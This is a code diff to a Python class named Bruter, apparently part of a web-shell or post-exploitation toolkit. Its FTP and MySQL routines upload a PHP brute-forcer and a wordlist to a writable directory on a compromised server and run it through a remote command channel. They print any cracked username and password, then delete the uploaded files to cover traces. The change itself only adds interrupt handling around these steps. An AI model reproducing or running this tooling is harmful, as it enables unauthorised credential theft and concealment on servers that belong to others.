@@ -22,16 +22,19 @@ class Bruter(object):
             file_handler.upload_file('modules/bruters/wordlist.txt', self.wordlist)
             cmd = 'cd {0}; php {1}'.format(folder, self.bruter_file)
             cprint('\n[+] Brute-Forcing FTP Creds ...', 'green')
-            creds = make_request.get_page_source(cmd)
-            creds = ''.join(creds).split(':')
-            if creds[0] == 'success':
-                username = colored(creds[1], 'blue')
-                password = colored(creds[2], 'blue')
-                print '[+] FTP Creds Username: {0}  Password: {1}'.format(username, password)
-            else:
-                cprint('[!] Couldn\'t brute-force FTP credentials', 'red')
+            try:
+                creds = make_request.get_page_source(cmd)
+                creds = ''.join(creds).split(':')
+                if creds[0] == 'success':
+                    username = colored(creds[1], 'blue')
+                    password = colored(creds[2], 'blue')
+                    print '[+] FTP Creds Username: {0}  Password: {1}'.format(username, password)
+                else:
+                    cprint('[!] Couldn\'t brute-force FTP credentials', 'red')
 
-            self.clean()
+                self.clean()
+            except KeyboardInterrupt:
+                self.clean()
 
     def mysql(self):
         folder = linux.get_writble_dir()
@@ -43,16 +46,19 @@ class Bruter(object):
             file_handler.upload_file('modules/bruters/wordlist.txt', self.wordlist)
             cmd = 'cd {0}; php {1}'.format(folder, self.bruter_file)
             cprint('\n[+] Brute-Forcing MySql Creds ...', 'green')
-            creds = make_request.get_page_source(cmd)
-            creds = ''.join(creds).split(':')
-            if creds[0] == 'success':
-                username = colored(creds[1], 'blue')
-                password = colored(creds[2], 'blue')
-                print '[+] MySql Creds Username: {0} Password: {1}'.format(username, password)
-            else:
-                cprint('[!] Couldn\'t brute-force MySql credentials', 'red')
+            try:
+                creds = make_request.get_page_source(cmd)
+                creds = ''.join(creds).split(':')
+                if creds[0] == 'success':
+                    username = colored(creds[1], 'blue')
+                    password = colored(creds[2], 'blue')
+                    print '[+] MySql Creds Username: {0} Password: {1}'.format(username, password)
+                else:
+                    cprint('[!] Couldn\'t brute-force MySql credentials', 'red')
 
-            self.clean()
+                self.clean()
+            except KeyboardInterrupt:
+                self.clean()
 
     def clean(self):
         clean = 'rm -f {0} {1}'.format(self.bruter_file, self.wordlist)
